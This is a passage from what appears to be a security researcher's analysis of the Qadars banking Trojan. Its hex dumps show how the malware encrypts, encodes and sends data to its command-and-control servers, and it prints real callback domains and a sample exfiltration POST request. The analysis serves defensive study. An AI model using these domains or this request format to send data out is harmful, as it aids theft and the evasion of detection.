014CFC10  56 DD BA 5F 63 2A 2C 01  B0 89 D4 19 FF 3F 4F 66  V&brvbar;&brvbar;_c*,.&brvbar;&euml;+. ?Of
014CFC20  54 5A 80 94 81 DA 1E 93  61 66 52 B4 B7 B5 45 09  TZ&Ccedil;&ouml;.+.&ocirc;afR&brvbar;+&brvbar;E.
014CFC30  B2 52 D1 37 2A 19 40 C3  77 07 EB B9 C2 B4 23 7D  &brvbar;R-7*.@+w.d&brvbar;-&brvbar;#}
014CFC40  10 31 8B A9 2E F1 4E 5E  67 46 09 8B 1C 5B ED F1  .1&iuml;&not;.&plusmn;N^gF.&iuml;.[f&plusmn;
014CFC50  07 C8 DB 3D 71 3A A8 96  58 F2 95 10 F0 D8 89 33  .+&brvbar;=q:&iquest;&ucirc;X=&ograve;.=+&euml;3
014CFC60  11 41 26 AD BD 99 A5 79  9A 11 DE A5 17 2A 68 86  .A&amp;&iexcl;+&Ouml;&Ntilde;y&Uuml;.&brvbar;&Ntilde;.*h&aring;
014CFC70  88 C0 03 04 EF 59 5C 7E  D4 9F 13 7F D2 90 B5 2A  &ecirc;+..nY\~+&fnof;..-.&brvbar;*
014CFC80  00 37 D6 08 91 CD 76 DD  9B EF CD B3 61 BF 66 D5  .7+.&aelig;-v&brvbar;&cent;n-&brvbar;a+f+
014CFC90  9B C4 B3 6B 49 41 F7 E8  34 39 64 17 5F CA AC 8B  &cent;-&brvbar;kIA&tilde;F49d._-&frac14;&iuml;
014CFCA0  1A C2 81 1F 23 09 15 C7  01 6F 51 61 74 93 79 28  .-..#..&brvbar;.oQat&ocirc;y(
014CFCB0  EA B8 74 28 D2 7F 09 34  CC C2 01 CE 5B 94 F0 3C  O+t(-..4&brvbar;-.+[&ouml;=&lt;
014CFCC0  EE 22 A9 3F C9 91 DC 0E  CB 98 D0 06 8B 25 A8 CA  e"&not;?+&aelig;_.-&yuml;-.&iuml;%&iquest;-
014CFCD0  73 43 E1 86 88 03 AB 34  83 E3 FC 6A EA 01 57 52  sC&szlig;&aring;&ecirc;.&frac12;4&acirc;pnjO.WR
014CFCE0  EB A8 52 3C 8A 7D 13 23  6F B0 DA 08 FC 90 31 98  d&iquest;R&lt;&egrave;}.#o&brvbar;+.n.1&yuml;
014CFCF0  FD E4 C4 DF 75 CE DC B6  DA DD B7 23 7C A8 A0 9B  &sup2;S-&macr;u+_&brvbar;+&brvbar;+#|&iquest;&aacute;&cent;</pre>
<p>The following data is generated based on the hard-coded data used to generate the initial AES key for encrypting data in the registry:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">014CE830  AA 00 00 00 08 00 CC F6  B7 9B 80 C0 6A 76 81 52  &not;.....&brvbar;&divide;+&cent;&Ccedil;+jv.R
014CE840  CA E5 6C EA 1C 81 C8 DD  56 FD 6B D4 99 71 5E 9D  -slO..+&brvbar;V&sup2;k+&Ouml;q^.
014CE850  A1 DF B2 2A 28 00 08 00  8A 78 46 D8 AA F0 D1 BB  &iacute;&macr;&brvbar;*(...&egrave;xF+&not;=-+
014CE860  64 A3 45 4C 43 94 C5 8F  ED A1 03 BD 1A 8A 38 5D  d&uacute;ELC&ouml;+.f&iacute;.+.&egrave;8]
014CE870  19 F0 DA 08 E7 24 22 00  08 00 FA 8A 21 0E 84 DF  .=+.t$"...&middot;&egrave;!.&auml;&macr;
014CE880  CE 54 FD 53 75 AB 3D 1F  99 23 43 9E 39 AE A2 55  +T&sup2;Su&frac12;=.&Ouml;#CP9&laquo;&oacute;U
014CE890  2C 15 09 DB 0E F2 A4 59  1A 00 08 00 88 26 CF E5  ,..&brvbar;.=&ntilde;Y....&ecirc;&amp;-s
014CE8A0  D4 71 5A D6 74 98 72 D0  5E 8C A6 F3 A1 CF 9C 5B  +qZ+t&yuml;r-^&icirc;&ordf;=&iacute;-&pound;[
014CE8B0  A7 5D 4C B0 FA B7 39 C2  7B A2 30 00 08 00 A4 06  &ordm;]L&brvbar;&middot;+9-{&oacute;0...&ntilde;.
014CE8C0  D9 5E 85 2F D6 0B 94 36  79 56 B6 31 73 87 18 F8  +^&agrave;/+.&ouml;6yV&brvbar;1s&ccedil;.&deg;
014CE8D0  69 8A FF 03 7F 20 82 20  14 28 51 E5 1A 00 AD BA  i&egrave; .. &eacute; .(Qs..&iexcl;&brvbar;</pre>
<p>This data is concatenated with the AES encrypted buffer:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">014CFD18  AA 00 00 00 08 00 CC F6  B7 9B 80 C0 6A 76 81 52  &not;.....&brvbar;&divide;+&cent;&Ccedil;+jv.R
014CFD28  CA E5 6C EA 1C 81 C8 DD  56 FD 6B D4 99 71 5E 9D  -slO..+&brvbar;V&sup2;k+&Ouml;q^.
014CFD38  A1 DF B2 2A 28 00 08 00  8A 78 46 D8 AA F0 D1 BB  &iacute;&macr;&brvbar;*(...&egrave;xF+&not;=-+
014CFD48  64 A3 45 4C 43 94 C5 8F  ED A1 03 BD 1A 8A 38 5D  d&uacute;ELC&ouml;+.f&iacute;.+.&egrave;8]
014CFD58  19 F0 DA 08 E7 24 22 00  08 00 FA 8A 21 0E 84 DF  .=+.t$"...&middot;&egrave;!.&auml;&macr;
014CFD68  CE 54 FD 53 75 AB 3D 1F  99 23 43 9E 39 AE A2 55  +T&sup2;Su&frac12;=.&Ouml;#CP9&laquo;&oacute;U
014CFD78  2C 15 09 DB 0E F2 A4 59  1A 00 08 00 88 26 CF E5  ,..&brvbar;.=&ntilde;Y....&ecirc;&amp;-s
014CFD88  D4 71 5A D6 74 98 72 D0  5E 8C A6 F3 A1 CF 9C 5B  +qZ+t&yuml;r-^&icirc;&ordf;=&iacute;-&pound;[
014CFD98  A7 5D 4C B0 FA B7 39 C2  7B A2 30 00 08 00 A4 06  &ordm;]L&brvbar;&middot;+9-{&oacute;0...&ntilde;.
014CFDA8  D9 5E 85 2F D6 0B 94 36  79 56 B6 31 73 87 18 F8  +^&agrave;/+.&ouml;6yV&brvbar;1s&ccedil;.&deg;
014CFDB8  69 8A FF 03 7F 20 82 20  14 28 51 E5 1A 00 99 76  i&egrave; .. &eacute; .(Qs..&Ouml;v
014CFDC8  C5 58 A7 34 93 BC 54 A6  85 54 DF 79 F6 1A B9 A2  +X&ordm;4&ocirc;+T&ordf;&agrave;T&macr;y&divide;.&brvbar;&oacute;
014CFDD8  47 46 1A FE 81 49 22 77  02 A2 10 ED EF 2D 41 43  GF.&brvbar;.I"w.&oacute;.fn-AC
014CFDE8  25 91 3E 3A F7 DE 9F C2  C8 EB FC 07 75 0F 87 44  %&aelig;&gt;:&tilde;&brvbar;&fnof;-+dn.u.&ccedil;D
014CFDF8  01 66 9F 1B 54 7D A0 64  D8 02 6C C1 ED BA 56 DD  .f&fnof;.T}&aacute;d+.l-f&brvbar;V&brvbar;
014CFE08  BA 5F 63 2A 2C 01 B0 89  D4 19 FF 3F 4F 66 54 5A  &brvbar;_c*,.&brvbar;&euml;+. ?OfTZ
014CFE18  80 94 81 DA 1E 93 61 66  52 B4 B7 B5 45 09 B2 52  &Ccedil;&ouml;.+.&ocirc;afR&brvbar;+&brvbar;E.&brvbar;R
014CFE28  D1 37 2A 19 40 C3 77 07  EB B9 C2 B4 23 7D 10 31  -7*.@+w.d&brvbar;-&brvbar;#}.1
014CFE38  8B A9 2E F1 4E 5E 67 46  09 8B 1C 5B ED F1 07 C8  &iuml;&not;.&plusmn;N^gF.&iuml;.[f&plusmn;.+
014CFE48  DB 3D 71 3A A8 96 58 F2  95 10 F0 D8 89 33 11 41  &brvbar;=q:&iquest;&ucirc;X=&ograve;.=+&euml;3.A
014CFE58  26 AD BD 99 A5 79 9A 11  DE A5 17 2A 68 86 88 C0  &amp;&iexcl;+&Ouml;&Ntilde;y&Uuml;.&brvbar;&Ntilde;.*h&aring;&ecirc;+
014CFE68  03 04 EF 59 5C 7E D4 9F  13 7F D2 90 B5 2A 00 37  ..nY\~+&fnof;..-.&brvbar;*.7
014CFE78  D6 08 91 CD 76 DD 9B EF  CD B3 61 BF 66 D5 9B C4  +.&aelig;-v&brvbar;&cent;n-&brvbar;a+f+&cent;-
014CFE88  B3 6B 49 41 F7 E8 34 39  64 17 5F CA AC 8B 1A C2  &brvbar;kIA&tilde;F49d._-&frac14;&iuml;.-
014CFE98  81 1F 23 09 15 C7 01 6F  51 61 74 93 79 28 EA B8  ..#..&brvbar;.oQat&ocirc;y(O+
014CFEA8  74 28 D2 7F 09 34 CC C2  01 CE 5B 94 F0 3C EE 22  t(-..4&brvbar;-.+[&ouml;=&lt;e"
014CFEB8  A9 3F C9 91 DC 0E CB 98  D0 06 8B 25 A8 CA 73 43  &not;?+&aelig;_.-&yuml;-.&iuml;%&iquest;-sC
014CFEC8  E1 86 88 03 AB 34 83 E3  FC 6A EA 01 57 52 EB A8  &szlig;&aring;&ecirc;.&frac12;4&acirc;pnjO.WRd&iquest;
014CFED8  52 3C 8A 7D 13 23 6F B0  DA 08 FC 90 31 98 FD E4  R&lt;&egrave;}.#o&brvbar;+.n.1&yuml;&sup2;S
014CFEE8  C4 DF 75 CE DC B6 DA DD  B7 23 7C A8 A0 9B AD BA  -&macr;u+_&brvbar;+&brvbar;+#|&iquest;&aacute;&cent;&iexcl;&brvbar;</pre>
<p>This buffer is then base64-encoded:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">014CFF18  71 67 41 41 41 41 67 41  7A 50 61 33 6D 34 44 41  qgAAAAgAzPa3m4DA
014CFF28  61 6E 61 42 55 73 72 6C  62 4F 6F 63 67 63 6A 64  anaBUsrlbOocgcjd
014CFF38  56 76 31 72 31 4A 6C 78  58 70 32 68 33 37 49 71  Vv1r1JlxXp2h37Iq
014CFF48  4B 41 41 49 41 49 70 34  52 74 69 71 38 4E 47 37  KAAIAIp4Rtiq8NG7
014CFF58  5A 4B 4E 46 54 45 4F 55  78 59 2F 74 6F 51 4F 39  ZKNFTEOUxY/toQO9
014CFF68  47 6F 6F 34 58 52 6E 77  32 67 6A 6E 4A 43 49 41  Goo4XRnw2gjnJCIA
014CFF78  43 41 44 36 69 69 45 4F  68 4E 2F 4F 56 50 31 54  CAD6iiEOhN/OVP1T
014CFF88  64 61 73 39 48 35 6B 6A  51 35 34 35 72 71 4A 56  das9H5kjQ545rqJV
014CFF98  4C 42 55 4A 32 77 37 79  70 46 6B 61 41 41 67 41  LBUJ2w7ypFkaAAgA
014CFFA8  69 43 62 50 35 64 52 78  57 74 5A 30 6D 48 4C 51  iCbP5dRxWtZ0mHLQ
014CFFB8  58 6F 79 6D 38 36 48 50  6E 46 75 6E 58 55 79 77  Xoym86HPnFunXUyw
014CFFC8  2B 72 63 35 77 6E 75 69  4D 41 41 49 41 4B 51 47  +rc5wnuiMAAIAKQG
014CFFD8  32 56 36 46 4C 39 59 4C  6C 44 5A 35 56 72 59 78  2V6FL9YLlDZ5VrYx
014CFFE8  63 34 63 59 2B 47 6D 4B  2F 77 4E 2F 49 49 49 67  c4cY+GmK/wN/IIIg
014CFFF8  46 43 68 52 35 52 6F 41  6D 58 62 46 57 4B 63 30  FChR5RoAmXbFWKc0
014D0008  6B 37 78 55 70 6F 56 55  33 33 6E 32 47 72 6D 69  k7xUpoVU33n2Grmi
014D0018  52 30 59 61 2F 6F 46 4A  49 6E 63 43 6F 68 44 74  R0Ya/oFJIncCohDt
014D0028  37 79 31 42 51 79 57 52  50 6A 72 33 33 70 2F 43  7y1BQyWRPjr33p/C
014D0038  79 4F 76 38 42 33 55 50  68 30 51 42 5A 70 38 62  yOv8B3UPh0QBZp8b
014D0048  56 48 32 67 5A 4E 67 43  62 4D 48 74 75 6C 62 64  VH2gZNgCbMHtulbd
014D0058  75 6C 39 6A 4B 69 77 42  73 49 6E 55 47 66 38 2F  ul9jKiwBsInUGf8/
014D0068  54 32 5A 55 57 6F 43 55  67 64 6F 65 6B 32 46 6D  T2ZUWoCUgdoek2Fm
014D0078  55 72 53 33 74 55 55 4A  73 6C 4C 52 4E 79 6F 5A  UrS3tUUJslLRNyoZ
014D0088  51 4D 4E 33 42 2B 75 35  77 72 51 6A 66 52 41 78  QMN3B+u5wrQjfRAx
014D0098  69 36 6B 75 38 55 35 65  5A 30 59 4A 69 78 78 62  i6ku8U5eZ0YJixxb
014D00A8  37 66 45 48 79 4E 73 39  63 54 71 6F 6C 6C 6A 79  7fEHyNs9cTqolljy
014D00B8  6C 52 44 77 32 49 6B 7A  45 55 45 6D 72 62 32 5A  lRDw2IkzEUEmrb2Z
014D00C8  70 58 6D 61 45 64 36 6C  46 79 70 6F 68 6F 6A 41  pXmaEd6lFypohojA
014D00D8  41 77 54 76 57 56 78 2B  31 4A 38 54 66 39 4B 51  AwTvWVx+1J8Tf9KQ
014D00E8  74 53 6F 41 4E 39 59 49  6B 63 31 32 33 5A 76 76  tSoAN9YIkc123Zvv
014D00F8  7A 62 4E 68 76 32 62 56  6D 38 53 7A 61 30 6C 42  zbNhv2bVm8Sza0lB
014D0108  39 2B 67 30 4F 57 51 58  58 38 71 73 69 78 72 43  9+g0OWQXX8qsixrC
014D0118  67 52 38 6A 43 52 58 48  41 57 39 52 59 58 53 54  gR8jCRXHAW9RYXST
014D0128  65 53 6A 71 75 48 51 6F  30 6E 38 4A 4E 4D 7A 43  eSjquHQo0n8JNMzC
014D0138  41 63 35 62 6C 50 41 38  37 69 4B 70 50 38 6D 52  Ac5blPA87iKpP8mR
014D0148  33 41 37 4C 6D 4E 41 47  69 79 57 6F 79 6E 4E 44  3A7LmNAGiyWoynND
014D0158  34 59 61 49 41 36 73 30  67 2B 50 38 61 75 6F 42  4YaIA6s0g+P8auoB
014D0168  56 31 4C 72 71 46 49 38  69 6E 30 54 49 32 2B 77  V1LrqFI8in0TI2+w
014D0178  32 67 6A 38 6B 44 47 59  2F 65 54 45 33 33 58 4F  2gj8kDGY/eTE33XO
014D0188  33 4C 62 61 33 62 63 6A  66 4B 69 67 6D 77 3D 3D  3Lba3bcjfKigmw==</pre>
<p>The base64-encoded buffer is checked for the presence of &ldquo;+&rdquo; and &ldquo;=&rdquo; characters. These characters are replaced with &ldquo;%2B&rdquo; and &ldquo;%3D&rdquo;, respectively. The malware creates an additional 7-byte-long pseudorandom string:</p>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true ">0012D780  6C 56 46 64 69 59 70 00  00 00 00 00 00 00 00 00  lVFdiYp</pre>
<p>This string is then prepended to the base64-encoded buffer:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">014D0C28  78 59 2F 74 6F 51 4F 39  47 6F 6F 34 58 52 6E 77  xY/toQO9Goo4XRnw
014D0C38  32 67 6A 6E 4A 43 49 41  43 41 44 36 69 69 45 4F  2gjnJCIACAD6iiEO
014D0C48  68 4E 2F 4F 56 50 31 54  64 61 73 39 48 35 6B 6A  hN/OVP1Tdas9H5kj
014D0C58  51 35 34 35 72 71 4A 56  4C 42 55 4A 32 77 37 79  Q545rqJVLBUJ2w7y
014D0C68  70 46 6B 61 41 41 67 41  69 43 62 50 35 64 52 78  pFkaAAgAiCbP5dRx
014D0C78  57 74 5A 30 6D 48 4C 51  58 6F 79 6D 38 36 48 50  WtZ0mHLQXoym86HP
014D0C88  6E 46 75 6E 58 55 79 77  25 32 42 72 63 35 77 6E  nFunXUyw%2Brc5wn
014D0C98  75 69 4D 41 41 49 41 4B  51 47 32 56 36 46 4C 39  uiMAAIAKQG2V6FL9
014D0CA8  59 4C 6C 44 5A 35 56 72  59 78 63 34 63 59 25 32  YLlDZ5VrYxc4cY%2
014D0CB8  42 47 6D 4B 2F 77 4E 2F  49 49 49 67 46 43 68 52  BGmK/wN/IIIgFChR
014D0CC8  35 52 6F 41 6D 58 62 46  57 4B 63 30 6B 37 78 55  5RoAmXbFWKc0k7xU
014D0CD8  70 6F 56 55 33 33 6E 32  47 72 6D 69 52 30 59 61  poVU33n2GrmiR0Ya
014D0CE8  2F 6F 46 4A 49 6E 63 43  6F 68 44 74 37 79 31 42  /oFJIncCohDt7y1B
014D0CF8  51 79 57 52 50 6A 72 33  33 70 2F 43 79 4F 76 38  QyWRPjr33p/CyOv8
014D0D08  42 33 55 50 68 30 51 42  5A 70 38 62 56 48 32 67  B3UPh0QBZp8bVH2g
014D0D18  5A 4E 67 43 62 4D 48 74  75 6C 62 64 75 6C 39 6A  ZNgCbMHtulbdul9j
014D0D28  4B 69 77 42 73 49 6E 55  47 66 38 2F 54 32 5A 55  KiwBsInUGf8/T2ZU
014D0D38  57 6F 43 55 67 64 6F 65  6B 32 46 6D 55 72 53 33  WoCUgdoek2FmUrS3
014D0D48  74 55 55 4A 73 6C 4C 52  4E 79 6F 5A 51 4D 4E 33  tUUJslLRNyoZQMN3
014D0D58  42 25 32 42 75 35 77 72  51 6A 66 52 41 78 69 36  B%2Bu5wrQjfRAxi6
014D0D68  6B 75 38 55 35 65 5A 30  59 4A 69 78 78 62 37 66  ku8U5eZ0YJixxb7f
014D0D78  45 48 79 4E 73 39 63 54  71 6F 6C 6C 6A 79 6C 52  EHyNs9cTqolljylR
014D0D88  44 77 32 49 6B 7A 45 55  45 6D 72 62 32 5A 70 58  Dw2IkzEUEmrb2ZpX
014D0D98  6D 61 45 64 36 6C 46 79  70 6F 68 6F 6A 41 41 77  maEd6lFypohojAAw
014D0DA8  54 76 57 56 78 25 32 42  31 4A 38 54 66 39 4B 51  TvWVx%2B1J8Tf9KQ
014D0DB8  74 53 6F 41 4E 39 59 49  6B 63 31 32 33 5A 76 76  tSoAN9YIkc123Zvv
014D0DC8  7A 62 4E 68 76 32 62 56  6D 38 53 7A 61 30 6C 42  zbNhv2bVm8Sza0lB
014D0DD8  39 25 32 42 67 30 4F 57  51 58 58 38 71 73 69 78  9%2Bg0OWQXX8qsix
014D0DE8  72 43 67 52 38 6A 43 52  58 48 41 57 39 52 59 58  rCgR8jCRXHAW9RYX
014D0DF8  53 54 65 53 6A 71 75 48  51 6F 30 6E 38 4A 4E 4D  STeSjquHQo0n8JNM
014D0E08  7A 43 41 63 35 62 6C 50  41 38 37 69 4B 70 50 38  zCAc5blPA87iKpP8
014D0E18  6D 52 33 41 37 4C 6D 4E  41 47 69 79 57 6F 79 6E  mR3A7LmNAGiyWoyn
014D0E28  4E 44 34 59 61 49 41 36  73 30 67 25 32 42 50 38  ND4YaIA6s0g%2BP8
014D0E38  61 75 6F 42 56 31 4C 72  71 46 49 38 69 6E 30 54  auoBV1LrqFI8in0T
014D0E48  49 32 25 32 42 77 32 67  6A 38 6B 44 47 59 2F 65  I2%2Bw2gj8kDGY/e
014D0E58  54 45 33 33 58 4F 33 4C  62 61 33 62 63 6A 66 4B  TE33XO3Lba3bcjfK
014D0E68  69 67 6D 77 25 33 44 25  33 44 00 00 00 00 00 00  igmw%3D%3D......</pre>
<p>This data becomes the content of the request sent to the C&amp;C by the malware. Shown below is the sequence of WinINet APIs used by the malware in order to establish communication with the C&amp;C:</p>
<pre class="height:100 width:100 width-unit:1 lang:default decode:true ">InternetOpenA -&gt; InternetConnectA -&gt; HttpOpenRequestA -&gt; InternetSetOptionA -&gt; 
HttpAddRequestHeadersA -&gt; InternetQueryOptionA -&gt; InternetSetOptionA -&gt; HttpSendRequestA .</pre>
<p>The malware creates a structure containing all request-related information:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true">0012C2F4  02 00 00 00 50 4F 53 54  00 00 00 00 00 00 00 00  ....POST........
0012C304  10 1A 41 00 78 E4 12 00  00 00 00 00 F0 7B 85 00  ..A.xS......={&agrave;.
0012C314  96 02 00 00 00 00 00 00  7F 00 00 01 50 00 73 6F  &ucirc;...........P.so
0012C324  66 74 2E 6B 63 73 73 6F  66 74 2E 62 69 7A 00 00  ft.kcssoft.biz..

+04     request type
+10     user-agent(pointer)  
+14     callback domain(pointer)
+1C     data(pointer)
+20     data size
+28     IP address
+2C     port
+2E     callback domain</pre>
<p>Sample request:</p>
<pre class="height-set:true height:150 height-unit:0 width:100 width-unit:1 lang:default decode:true ">POST /netreport.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)
Host: linksbacksreport.com
Content-Length: 660
Cache-Control: no-cache

ROVivvn=qgAAAAgAnARHff0xZPE00vxRaB9ckHI5PjMe1aS2Esg25vckKQAIAKFrp8coemQ03zIpl
j77vqVlZSznbkKODJhKHmHZ4SsACAARNkkvw57mRSjtycoWwPyy0kftYPDihXzAUSN0V9sFAAgAxy
Dorqby0JdIt8dt3evWx2UzRarDJehmERfgEMusBQAIAKTf4bMa6zL6dkzPu3yq5/J8BUPk0e/ss9c
mZdJpBgMAxGjEiHDNUZ/0/FiYXB4uXxPAeTeNHTDj3LQEmuejOkcBEN4K0zB3ch2uTWPlpFHP5o68
X5BUP/1rFgCO%2BTHJ4hHJXylQY4hmm1LtyGHw5ZYaJxrMtWK%2BcKCeUVs/Hq/dV3E4BkeLklzkT
9S5%2B5oxSF6d4aAxyee7VzwAg9pBZGXZxyJQBDCVuAjyw1QSeial8vI69Q9I9ACgJ9YxWVeFHTF%
2B7CTzyqR3DChYFuNmzsZ8AUR6SpfyZKxRtRQpz3XEb0k7Wqk3WgJHAtzBhq5suMZzHYMQaeDow6Q
JIL52WsEPCig35m5EfIC9Bh1RZkcvnw44p7axtBQ3D2Ue7fKTFknARNvQHvkzXt7QiCUkwLBpUs1z
p3vhbhdyKVBCKP65biyzElXdZEh/D49UnoFG8w%3D%3D
</pre>
<h2>Conclusion</h2>
<p>The first stage was successful in hiding the main malware module from the antivirus engines at the time it first appeared in the wild. But Stage 1 fails to hide the main module at present as antivirus&nbsp;signatures. Encrypted communication creates difficulties for the dynamic analysis&nbsp;since&nbsp;it makes it hard to understand the payload creation. Persistence mechanisms employed by the malware (scheduling a task at the next login) is uncommon.</p>

</body></html>
<div id="nc_pixel"></div><div class="post__tags">
        <a href="https://securityintelligence.com/tag/advanced-threats/" rel="tag">Advanced Threats</a><span>&nbsp;|&nbsp;</span><a href="https://securityintelligence.com/tag/banking-trojan/" rel="tag">Banking Trojan</a><span>&nbsp;|&nbsp;</span><a href="https://securityintelligence.com/tag/qadars-trojan/" rel="tag">Qadars Trojan</a><span>&nbsp;|&nbsp;</span><a href="https://securityintelligence.com/tag/threat-intelligence-2/" rel="tag">Threat Intelligence</a><span>&nbsp;|&nbsp;</span><a href="https://securityintelligence.com/tag/x-force/" rel="tag">X-Force</a></div>


<div class="post__author author  ">
      <div class="author__box">
            <div class="author__photo" style="background-image:  url(https://securityintelligence.com/wp-content/uploads/2014/10/me2.jpeg);"></div>
            <div class="author__infos">

                  <div class="author__name"><a href="https://securityintelligence.com/author/igor-aronov/" >Igor Aronov</a></div>
                  <div class="author__role">X-Force Advanced Researcher</div>
            </div>
      </div>


      </div>
<!-- CONTINUE READING -->
             </main>
            </div>

            
      </div>

      
<aside class="grid__sidebar post__sidebar ">
      <div class="mobile_divider"></div>
      <header class="post__sidebar__header">POPULAR</header>

      

      <!-- ARTICLES  -->
      
      <article class="article article_grid article__mobile--card">
            <!-- IMG -->
            <a class="exclusive_article__category_link" href="https://securityintelligence.com/articles/making-smart-cybersecurity-spending-decisions-in-2025/" aria-label="Making smart cybersecurity spending decisions in 2025">
                  <div class="article__img">                <amp-img alt="People working together at a desk, focus on tablets, laptops & hands in the middle of desk, large window background" width="1200" height="630" layout="responsive" src="/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2024/12/Group-of-business-people-meeting-discussing-analyzing-graphs-financial-data-and-planning-a-marketing-project-together-630x330.jpeg.webp">
                    <amp-img fallback alt="People working together at a desk, focus on tablets, laptops & hands in the middle of desk, large window background" width="1200" height="630" layout="responsive" src="https://securityintelligence.com/wp-content/uploads/2024/12/Group-of-business-people-meeting-discussing-analyzing-graphs-financial-data-and-planning-a-marketing-project-together-630x330.jpeg">
                    </amp-img>
                </amp-img>
            </div>
            </a>
            <!-- TXT -->
            <div class="article__text_container" style="-webkit-box-orient: vertical;">
                  <!-- CAT -->
                                                                  <a class="article__category_link" href="https://securityintelligence.com/category/topics/ciso-corner/" aria-label="https://securityintelligence.com/category/topics/ciso-corner/">
                              CISO  
                        </a>

                                    <!-- DATE  -->
                  <span class="article__date">
                        December 13, 2024                  </span>
                  <!-- TITLE & EXCERPT -->
                  <a href="https://securityintelligence.com/articles/making-smart-cybersecurity-spending-decisions-in-2025/" class="article__content_link" aria-label="Making smart cybersecurity spending decisions in 2025">
                        <h2 class="article__title">Making smart cybersecurity spending decisions in 2025</h2>
                        <p class="article__excerpt" style="-webkit-box-orient: vertical;">
                              <span class="article__read_time"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 4</span> <span class="rt-label rt-postfix">min read</span></span> - </span>December is a month of numbers, from holiday countdowns to RSVPs for parties. But for business leaders, the most important numbers this month are the budget numbers for 2025. With cybersecurity a top focus for many businesses in 2025, it&hellip;                        </p>
                  </a>
            </div>
      </article>

      <article class="article article_grid article__mobile--card">
            <!-- IMG -->
            <a class="exclusive_article__category_link" href="https://securityintelligence.com/articles/what-telegrams-recent-policy-shift-means-for-cyber-crime/" aria-label="What Telegram’s recent policy shift means for cyber crime">
                  <div class="article__img">                <amp-img alt="" width="1200" height="630" layout="responsive" src="/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2024/11/A-dark-mystery-hand-typing-on-a-laptop-computer-at-night-630x330.jpeg.webp">
                    <amp-img fallback alt="" width="1200" height="630" layout="responsive" src="https://securityintelligence.com/wp-content/uploads/2024/11/A-dark-mystery-hand-typing-on-a-laptop-computer-at-night-630x330.jpeg">
                    </amp-img>
                </amp-img>
            </div>
            </a>
            <!-- TXT -->
            <div class="article__text_container" style="-webkit-box-orient: vertical;">
                  <!-- CAT -->
                                                                  <a class="article__category_link" href="https://securityintelligence.com/category/topics/risk-management/" aria-label="https://securityintelligence.com/category/topics/risk-management/">
                              Risk Management  
                        </a>

                                    <!-- DATE  -->
                  <span class="article__date">
                        November 6, 2024                  </span>
                  <!-- TITLE & EXCERPT -->
                  <a href="https://securityintelligence.com/articles/what-telegrams-recent-policy-shift-means-for-cyber-crime/" class="article__content_link" aria-label="What Telegram’s recent policy shift means for cyber crime">
                        <h2 class="article__title">What Telegram’s recent policy shift means for cyber crime</h2>
                        <p class="article__excerpt" style="-webkit-box-orient: vertical;">
                              <span class="article__read_time"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 4</span> <span class="rt-label rt-postfix">min read</span></span> - </span>Since its launch in August 2013, Telegram has become the go-to messaging app for privacy-focused users. To start using the app, users can sign up using either their real phone number or an anonymous number purchased from the Fragment blockchain&hellip;                        </p>
                  </a>
            </div>
      </article>

      <article class="article article_grid article__mobile--card">
            <!-- IMG -->
            <a class="exclusive_article__category_link" href="https://securityintelligence.com/articles/security-roundup-top-ai-stories-in-2024/" aria-label="Security roundup: Top AI stories in 2024">
                  <div class="article__img">                <amp-img alt="An artificial intelligence robot working on a computer at a desk in an office with other people at other desks" width="1200" height="630" layout="responsive" src="/wp-content/webp-express/webp-images/doc-root/wp-content/uploads/2024/12/Artificial-Intelligence-Smart-Robot-Replacing-Human-630x330.jpeg.webp">
                    <amp-img fallback alt="An artificial intelligence robot working on a computer at a desk in an office with other people at other desks" width="1200" height="630" layout="responsive" src="https://securityintelligence.com/wp-content/uploads/2024/12/Artificial-Intelligence-Smart-Robot-Replacing-Human-630x330.jpeg">
                    </amp-img>
                </amp-img>
            </div>
            </a>
            <!-- TXT -->
            <div class="article__text_container" style="-webkit-box-orient: vertical;">
                  <!-- CAT -->
                                                                  <a class="article__category_link" href="https://securityintelligence.com/category/topics/artificial-intelligence/" aria-label="https://securityintelligence.com/category/topics/artificial-intelligence/">
                              Artificial Intelligence  
                        </a>

                                    <!-- DATE  -->
                  <span class="article__date">
                        December 12, 2024                  </span>
                  <!-- TITLE & EXCERPT -->
                  <a href="https://securityintelligence.com/articles/security-roundup-top-ai-stories-in-2024/" class="article__content_link" aria-label="Security roundup: Top AI stories in 2024">
                        <h2 class="article__title">Security roundup: Top AI stories in 2024</h2>
                        <p class="article__excerpt" style="-webkit-box-orient: vertical;">
                              <span class="article__read_time"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 3</span> <span class="rt-label rt-postfix">min read</span></span> - </span>2024 has been a banner year for artificial intelligence (AI). As enterprises ramp up adoption, however, malicious actors have been exploring new ways to compromise systems with intelligent attacks. With the AI landscape rapidly evolving, it&rsquo;s worth looking back before&hellip;                        </p>
                  </a>
            </div>
      </article>

      <!-- ADVERTISEMENT -->
                  <div class="billboard_wrapper">
                  <a href="https://www.ibm.com/reports/data-breach?utm_medium=OSocial&utm_source=Blog&utm_content=RSRWW&utm_id=si-blog-right-rail " aria-label="A SPONSORED flag ">
                        <amp-img layout='responsive' widht='300' height='250' src="https://securityintelligence.com/wp-content/uploads/2024/07/SIB_CODB_rightrail_banners2024-think_600x1200.png" alt="CODB right rail banner with red, blue, &amp; purple lines in a wide circular pattern">
                        </amp-img>
                  </a>
            </div>
      
</aside>
</div>
<script>
      const kaltura = document.querySelectorAll("[data-widget=\"videoplayer\"]")
      if (kaltura != null) {
            kaltura.forEach(function(item){
                  const kId = item.id + '--' + item.dataset.videoid;
                  document.getElementById(item.id).id = kId;
                  getKalturaVideo(item);
            })
      }
      
</script>

<div class="card_container_background ">
    <section class="container cards">
        <h3>More from X-Force</h3>
        <div class="cards__wrapper">
            
<article class="article article--card cards__article_grid ">
            <!-- IMG -->
